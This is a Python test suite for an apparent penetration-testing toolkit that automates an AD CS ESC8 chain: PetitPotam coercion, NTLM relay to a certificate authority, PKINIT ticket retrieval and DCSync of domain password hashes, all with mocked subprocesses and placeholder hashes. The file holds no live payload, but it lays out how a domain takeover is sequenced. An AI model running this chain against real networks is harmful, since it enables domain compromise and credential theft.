#!/usr/bin/env python3
"""Post-relay primitives — D4.

Two new modules land in D4: fieldkit.pkinit (cert → TGT via
certipy-ad auth) and fieldkit.dcsync (TGT → NTDS dump via nxc).
Both share the graceful-fallback shape (no-tool → command_hint)
first shipped in D2 for PetitPotam.

Plus the end-to-end esc8 chain walkthrough: mock every subprocess
via runner.run / runner.spawn, walk esc8_chain, assert every step
lands ok (or manual for the coerce step when no PetitPotam tool is
present) and the final chain artifacts contain the recovered
credentials.
"""
import base64
import os
import socket
import sys
import tempfile
import threading
import unittest
from unittest.mock import patch, MagicMock

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))


def _mk_run_result(stdout="", stderr="", exit_code=0, error=None,
                   timed_out=False):
    from fieldkit.runner import RunResult
    return RunResult(argv=["fake"], exit_code=exit_code, stdout=stdout,
                      stderr=stderr, error=error, timed_out=timed_out)


class PkinitFindToolTest(unittest.TestCase):

    def test_prefers_certipy_ad_on_path(self):
        from fieldkit import pkinit
        with patch("shutil.which", side_effect=lambda n:
                    "/usr/bin/certipy-ad" if n == "certipy-ad" else None):
            self.assertEqual(pkinit.find_tool(), "/usr/bin/certipy-ad")

    def test_none_when_missing(self):
        from fieldkit import pkinit
        with patch("shutil.which", return_value=None):
            self.assertIsNone(pkinit.find_tool())


class PkinitAuthTest(unittest.TestCase):

    def test_no_tool_returns_command_hint(self):
        from fieldkit import pkinit
        with patch.object(pkinit, "find_tool", return_value=None):
            r = pkinit.auth(principal="CORP/DC01$", pfx_path="/tmp/x.pfx",
                             domain="CORP.LOCAL", dc_ip="10.0.0.1")
        self.assertEqual(r.kind, "no-tool")
        self.assertIn("certipy-ad", r.command_hint)
        self.assertIn("CORP.LOCAL", r.command_hint)
        self.assertIn("10.0.0.1", r.command_hint)

    def test_ok_output_extracts_ccache_path_and_nt_hash(self):
        from fieldkit import pkinit
        from fieldkit import runner as runner_mod
        stdout = (
            "[*] Got TGT for CORP/DC01$\n"
            "[*] Saved credential cache to '/tmp/dc01.ccache'\n"
            "[*] Got hash for CORP/DC01$@CORP.LOCAL: "
            "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0\n"
        )
        with patch.object(runner_mod, "run",
                    return_value=_mk_run_result(stdout=stdout)):
            r = pkinit.auth("CORP/DC01$", "/tmp/x.pfx", "CORP.LOCAL",
                             "10.0.0.1", tool_bin="/usr/bin/certipy-ad")
        self.assertEqual(r.kind, "ok")
        self.assertEqual(r.ccache_path, "/tmp/dc01.ccache")
        self.assertIn("31d6cfe0d16ae931b73c59d7e0c089c0", r.nt_hash)

    def test_kdc_reject_maps_to_kdc_reject_kind(self):
        from fieldkit import pkinit
        from fieldkit import runner as runner_mod
        with patch.object(runner_mod, "run",
                    return_value=_mk_run_result(
                        stdout="[-] KDC_ERR_CERTIFICATE_MISMATCH\n")):
            r = pkinit.auth("CORP/DC01$", "/tmp/x.pfx", "CORP.LOCAL",
                             "10.0.0.1", tool_bin="/usr/bin/certipy-ad")
        self.assertEqual(r.kind, "kdc-reject")

    def test_timeout_maps_to_unreachable(self):
        from fieldkit import pkinit
        from fieldkit import runner as runner_mod
        with patch.object(runner_mod, "run",
                    return_value=_mk_run_result(timed_out=True,
                                                  error="timed out")):
            r = pkinit.auth("CORP/DC01$", "/tmp/x.pfx", "CORP.LOCAL",
                             "10.0.0.1", tool_bin="/usr/bin/certipy-ad")
        self.assertEqual(r.kind, "unreachable")


class DcsyncFindToolTest(unittest.TestCase):

    def test_prefers_nxc_on_path(self):
        from fieldkit import dcsync
        with patch("shutil.which", side_effect=lambda n:
                    "/usr/bin/nxc" if n == "nxc" else None):
            self.assertEqual(dcsync.find_tool(), "/usr/bin/nxc")


class DcsyncParseTest(unittest.TestCase):

    def test_parses_impacket_style_ntds_rows(self):
        from fieldkit.dcsync import _parse_credentials
        text = (
            "SMB   10.0.0.1  445  DC01   [+] Dumping NTDS\n"
            "CORP\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:"
            "abababababababababababababababab:::\n"
            "CORP\\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:"
            "cdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcd:::\n"
            "CORP\\alice:1103:aad3b435b51404eeaad3b435b51404ee:"
            "efefefefefefefefefefefefefefefef:::\n"
        )
        creds = _parse_credentials(text)
        self.assertEqual(len(creds), 3)
        self.assertEqual(creds[0].principal, "CORP\\Administrator")
        self.assertEqual(creds[0].rid, "500")
        self.assertTrue(creds[0].nt_hash.endswith(
            "abababababababababababababababab"))
        self.assertEqual(creds[1].principal, "CORP\\krbtgt")


class DcsyncFireTest(unittest.TestCase):

    def test_no_tool_returns_command_hint(self):
        from fieldkit import dcsync
        with patch.object(dcsync, "find_tool", return_value=None):
            r = dcsync.dcsync(dc_ip="10.0.0.1",
                                ccache_path="/tmp/dc01.ccache")
        self.assertEqual(r.kind, "no-tool")
        self.assertIn("KRB5CCNAME", r.command_hint)
        self.assertIn("/tmp/dc01.ccache", r.command_hint)

    def test_ok_populates_credentials(self):
        from fieldkit import dcsync
        from fieldkit import runner as runner_mod
        stdout = (
            "CORP\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:"
            "abababababababababababababababab:::\n"
        )
        with patch.object(runner_mod, "run",
                    return_value=_mk_run_result(stdout=stdout)):
            r = dcsync.dcsync(dc_ip="10.0.0.1",
                                ccache_path="/tmp/dc01.ccache",
                                tool_bin="/usr/bin/nxc")
        self.assertEqual(r.kind, "ok")
        self.assertEqual(len(r.credentials), 1)

    def test_denied_signature_maps_to_denied(self):
        from fieldkit import dcsync
        from fieldkit import runner as runner_mod
        with patch.object(runner_mod, "run",
                    return_value=_mk_run_result(
                        stdout="[-] STATUS_ACCESS_DENIED — DRSGetNCChanges failed\n")):
            r = dcsync.dcsync(dc_ip="10.0.0.1",
                                ccache_path="/tmp/x",
                                tool_bin="/usr/bin/nxc")
        self.assertEqual(r.kind, "denied")

    def test_missing_auth_returns_fail(self):
        from fieldkit import dcsync
        r = dcsync.dcsync(dc_ip="10.0.0.1",
                           tool_bin="/usr/bin/nxc")
        self.assertEqual(r.kind, "fail")
        self.assertIn("ccache", r.detail)


class ChainCertRequestStepTest(unittest.TestCase):
    """post:cert-request — validates the cert bytes captured by relay:capture."""

    def _chain_with_artifacts(self, **artifacts):
        from fieldkit.chain import esc8_chain, Chain
        full = esc8_chain("10.0.0.1")
        by_name = {s.name: s for s in full.steps}
        ch = Chain(profile="esc8", target="10.0.0.1",
                   steps=(by_name["post:cert-request"],))
        ch.artifacts.update(artifacts)
        return ch

    def test_missing_cert_bytes_fails(self):
        from fieldkit.chain import walk
        ch = self._chain_with_artifacts(cert_principal="CORP/DC01$")
        walk(ch, None)
        self.assertEqual(ch.outcomes[0].kind, "fail")
        self.assertIn("no cert_bytes", ch.outcomes[0].evidence)

    def test_missing_principal_fails(self):
        from fieldkit.chain import walk
        cert = base64.b64encode(b"X" * 500).decode()
        ch = self._chain_with_artifacts(cert_bytes=cert)
        walk(ch, None)
        self.assertEqual(ch.outcomes[0].kind, "fail")
        self.assertIn("no cert_principal", ch.outcomes[0].evidence)

    def test_bad_base64_fails(self):
        from fieldkit.chain import walk
        ch = self._chain_with_artifacts(cert_bytes="not-valid-base64!!!",
                                          cert_principal="CORP/DC01$")
        walk(ch, None)
        self.assertEqual(ch.outcomes[0].kind, "fail")

    def test_valid_cert_advances(self):
        from fieldkit.chain import walk
        cert = base64.b64encode(b"X" * 500).decode()
        ch = self._chain_with_artifacts(cert_bytes=cert,
                                          cert_principal="CORP/DC01$")
        walk(ch, None)
        self.assertEqual(ch.outcomes[0].kind, "ok")
        self.assertIn("CORP/DC01$", ch.outcomes[0].evidence)


class ChainPkinitStepTest(unittest.TestCase):

    def _walk_pkinit(self, ctx_overrides=None, pkinit_result=None):
        from fieldkit.chain import esc8_chain, walk, Chain
        from fieldkit import pkinit as pkinit_mod
        full = esc8_chain("10.0.0.1")
        by_name = {s.name: s for s in full.steps}
        ch = Chain(profile="esc8", target="10.0.0.1",
                   steps=(by_name["post:pkinit-tgt"],))
        ch.artifacts.update({
            "cert_bytes": base64.b64encode(b"X" * 500).decode(),
            "cert_principal": "CORP/DC01$",
        })

        class Ctx:
            domain = "CORP.LOCAL"
            pkinit_tool_bin = "/usr/bin/certipy-ad"
            pkinit_timeout = 5
            store = None
        for k, v in (ctx_overrides or {}).items():
            setattr(Ctx, k, v)

        if pkinit_result is not None:
            with patch.object(pkinit_mod, "auth",
                               return_value=pkinit_result):
                walk(ch, Ctx())
        else:
            walk(ch, Ctx())
        return ch

    def test_no_domain_produces_manual_outcome(self):
        ch = self._walk_pkinit(ctx_overrides={"domain": None})
        self.assertEqual(ch.outcomes[0].kind, "manual")
        self.assertIn("domain", ch.outcomes[0].evidence)

    def test_no_tool_maps_to_manual_with_hint(self):
        from fieldkit.pkinit import PkinitResult
        ch = self._walk_pkinit(pkinit_result=PkinitResult(
            kind="no-tool", principal="CORP/DC01$",
            command_hint="certipy-ad auth -pfx …"))
        self.assertEqual(ch.outcomes[0].kind, "manual")
        self.assertIn("certipy-ad", ch.outcomes[0].evidence)

    def test_ok_persists_ccache_path_into_chain_artifacts(self):
        from fieldkit.pkinit import PkinitResult
        ch = self._walk_pkinit(pkinit_result=PkinitResult(
            kind="ok", principal="CORP/DC01$",
            ccache_path="/tmp/dc01.ccache",
            nt_hash="aad3b435b51404eeaad3b435b51404ee:"
                     "31d6cfe0d16ae931b73c59d7e0c089c0"))
        self.assertEqual(ch.outcomes[0].kind, "ok")
        self.assertEqual(ch.artifacts["ccache_path"], "/tmp/dc01.ccache")
        self.assertIn("31d6cfe0", ch.artifacts["pkinit_nt_hash"])

    def test_kdc_reject_maps_to_fail(self):
        from fieldkit.pkinit import PkinitResult
        ch = self._walk_pkinit(pkinit_result=PkinitResult(
            kind="kdc-reject", principal="CORP/DC01$",
            detail="[-] KDC_ERR_CERTIFICATE_MISMATCH"))
        self.assertEqual(ch.outcomes[0].kind, "fail")

    def test_ok_persists_loot_when_store_supplied(self):
        # ccache path lands as loot(kind='ccache'); NT hash as
        # loot(kind='nthash').
        from fieldkit.pkinit import PkinitResult
        from fieldkit.state import Store
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        s = Store.create(os.path.join(tmp.name, "e.db"))
        s.init_engagement("test")
        self.addCleanup(s.close)
        self._walk_pkinit(
            ctx_overrides={"store": s},
            pkinit_result=PkinitResult(
                kind="ok", principal="CORP/DC01$",
                ccache_path="/tmp/dc01.ccache",
                nt_hash="aad3b435b51404eeaad3b435b51404ee:"
                         "31d6cfe0d16ae931b73c59d7e0c089c0"))
        loot_kinds = {r["kind"] for r in s.conn.execute(
            "SELECT kind FROM loot").fetchall()}
        self.assertIn("ccache", loot_kinds)
        self.assertIn("nthash", loot_kinds)


class ChainDcsyncStepTest(unittest.TestCase):

    def _walk_dcsync(self, ctx_overrides=None, dcsync_result=None):
        from fieldkit.chain import esc8_chain, walk, Chain
        from fieldkit import dcsync as dcsync_mod
        full = esc8_chain("10.0.0.1")
        by_name = {s.name: s for s in full.steps}
        ch = Chain(profile="esc8", target="10.0.0.1",
                   steps=(by_name["post:dcsync"],))
        ch.artifacts.update({
            "ccache_path": "/tmp/dc01.ccache",
            "pkinit_nt_hash": "aad3b435b51404eeaad3b435b51404ee:"
                              "31d6cfe0d16ae931b73c59d7e0c089c0",
            "pkinit_principal": "CORP/DC01$",
        })

        class Ctx:
            domain = "CORP.LOCAL"
            dcsync_tool_bin = "/usr/bin/nxc"
            dcsync_timeout = 5
            store = None
        for k, v in (ctx_overrides or {}).items():
            setattr(Ctx, k, v)

        if dcsync_result is not None:
            with patch.object(dcsync_mod, "dcsync",
                               return_value=dcsync_result):
                walk(ch, Ctx())
        else:
            walk(ch, Ctx())
        return ch

    def test_ok_result_credentials_land_in_store(self):
        from fieldkit.dcsync import DcsyncResult, DcsyncCredential
        from fieldkit.state import Store
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        s = Store.create(os.path.join(tmp.name, "e.db"))
        s.init_engagement("test")
        self.addCleanup(s.close)
        creds = (
            DcsyncCredential(
                principal="CORP\\Administrator", rid="500",
                nt_hash="aad3b435b51404eeaad3b435b51404ee:"
                         "abababababababababababababababab"),
            DcsyncCredential(
                principal="CORP\\alice", rid="1103",
                nt_hash="aad3b435b51404eeaad3b435b51404ee:"
                         "efefefefefefefefefefefefefefefef"),
        )
        ch = self._walk_dcsync(
            ctx_overrides={"store": s},
            dcsync_result=DcsyncResult(kind="ok", credentials=creds))
        self.assertEqual(ch.outcomes[0].kind, "ok")
        self.assertGreaterEqual(len(s.credentials()), 2)
        self.assertEqual(ch.artifacts["dcsync_count"], 2)
        self.assertEqual(ch.artifacts["dcsync_persisted"], 2)

    def test_denied_maps_to_fail(self):
        from fieldkit.dcsync import DcsyncResult
        ch = self._walk_dcsync(
            dcsync_result=DcsyncResult(kind="denied",
                                         detail="STATUS_ACCESS_DENIED"))
        self.assertEqual(ch.outcomes[0].kind, "fail")

    def test_no_tool_maps_to_manual(self):
        from fieldkit.dcsync import DcsyncResult
        ch = self._walk_dcsync(
            dcsync_result=DcsyncResult(kind="no-tool",
                                         command_hint="nxc smb …"))
        self.assertEqual(ch.outcomes[0].kind, "manual")


class ESC8EndToEndTest(unittest.TestCase):
    """The load-bearing D4 pin: mock every subprocess, walk the full
    esc8 chain, assert every step lands ok (or manual for coerce
    when no PetitPotam is on PATH) and artifacts contain the
    recovered accounts."""

    def _open_local_listener(self):
        s = socket.socket()
        s.bind(("127.0.0.1", 0))
        s.listen(1)
        port = s.getsockname()[1]
        def _acc():
            try:
                while True:
                    c, _ = s.accept()
                    c.close()
            except OSError:
                return
        t = threading.Thread(target=_acc, daemon=True)
        t.start()
        return port, s

    def _fake_relay_proc(self):
        proc = MagicMock()
        proc.pid = 4242
        proc.poll = MagicMock(return_value=None)
        proc.stdout = iter([
            "[*] Running in relay mode\n",
            "[*] Setting up SMB Server\n",
            "[*] Authenticating against http://ca.corp.local as CORP/DC01$\n",
            "[*] Base64 certificate of user CORP/DC01$\n",
            "MIIB" + "A" * 500 + "\n",
        ])
        proc.send_signal = MagicMock()
        proc.wait = MagicMock(return_value=0)
        proc.kill = MagicMock()
        return proc

    def _fake_run(self, argv, **kw):
        stdout = ""
        binary = argv[0] if argv else ""
        if "certipy" in binary:
            stdout = ("[*] Got TGT for CORP/DC01$\n"
                       "[*] Saved credential cache to '/tmp/dc01.ccache'\n"
                       "[*] Got hash for CORP/DC01$: "
                       "aad3b435b51404eeaad3b435b51404ee:"
                       "31d6cfe0d16ae931b73c59d7e0c089c0\n")
        elif "nxc" in binary or "netexec" in binary:
            stdout = (
                "CORP\\Administrator:500:"
                "aad3b435b51404eeaad3b435b51404ee:"
                "abababababababababababababababab:::\n"
                "CORP\\krbtgt:502:"
                "aad3b435b51404eeaad3b435b51404ee:"
                "cdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcd:::\n"
                "CORP\\alice:1103:"
                "aad3b435b51404eeaad3b435b51404ee:"
                "efefefefefefefefefefefefefefefef:::\n"
            )
        return _mk_run_result(stdout=stdout)

    def test_full_esc8_chain_proves_with_mocked_subprocesses(self):
        from fieldkit.chain import esc8_chain, walk
        from fieldkit.state import Store

        # Give reachability a real bound port.
        port, sock = self._open_local_listener()
        self.addCleanup(sock.close)

        # Persist Store for account persistence check.
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        s = Store.create(os.path.join(tmp.name, "e.db"))
        s.init_engagement("test")
        self.addCleanup(s.close)

        class Ctx:
            probe_port = port
            probe_timeout = 1.0
            listener_uri = None
            cred = None
            listener_ip = "10.0.0.5"
            ca_endpoint = "ca.corp.local"
            template = "DomainController"
            relay_port_smb = 4445
            relay_port_http = 8080
            relay_bind_addr = "0.0.0.0"
            relay_tool_bin = "/usr/bin/impacket-ntlmrelayx"
            relay_bind_wait = 0.5
            relay_wait_capture = 1.0
            petitpotam_tool_bin = None       # falls back to no-tool → manual
            petitpotam_timeout = 5
            domain = "CORP.LOCAL"
            pkinit_tool_bin = "/usr/bin/certipy-ad"
            pkinit_timeout = 5
            dcsync_tool_bin = "/usr/bin/nxc"
            dcsync_timeout = 5
        Ctx.store = s

        ch = esc8_chain("127.0.0.1")
        with patch("fieldkit.runner.spawn",
                    return_value=self._fake_relay_proc()), \
             patch("fieldkit.runner.run", side_effect=self._fake_run):
            walk(ch, Ctx())

        # Chain proves (manual outcomes advance; no fail/skip).
        self.assertEqual(ch.status, "proven",
                         msg=f"outcomes: {[(s.name, o.kind, o.evidence[:60]) for s, o in zip(ch.steps, ch.outcomes)]}")

        # Every one of the 7 steps ran.
        self.assertEqual(len(ch.outcomes), 7)

        # coerce:petitpotam was manual (no tool on the test machine);
        # every other step was ok.
        by_name = {ch.steps[i].name: ch.outcomes[i]
                   for i in range(len(ch.outcomes))}
        self.assertEqual(by_name["preflight:reachability"].kind, "ok")
        self.assertEqual(by_name["coerce:petitpotam"].kind, "manual")
        self.assertEqual(by_name["relay:listen"].kind, "ok")
        self.assertEqual(by_name["relay:capture"].kind, "ok")
        self.assertEqual(by_name["post:cert-request"].kind, "ok")
        self.assertEqual(by_name["post:pkinit-tgt"].kind, "ok")
        self.assertEqual(by_name["post:dcsync"].kind, "ok")

        # Artifacts thread through the whole chain.
        self.assertEqual(ch.artifacts["cert_principal"], "CORP/DC01$")
        self.assertEqual(ch.artifacts["ccache_path"], "/tmp/dc01.ccache")
        self.assertEqual(ch.artifacts["dcsync_count"], 3)
        self.assertGreaterEqual(ch.artifacts["dcsync_persisted"], 1)

        # Store side-effects: 3 dcsync accounts + 1 relay-adcs cert
        # + loot rows for the ccache + NT hash.
        self.assertGreaterEqual(len(s.credentials()), 1)
        self.assertGreaterEqual(len(s.certificates()), 1)
        loot_kinds = {r["kind"] for r in
                       s.conn.execute("SELECT kind FROM loot").fetchall()}
        self.assertIn("ccache", loot_kinds)
        self.assertIn("nthash", loot_kinds)


if __name__ == "__main__":
    unittest.main()
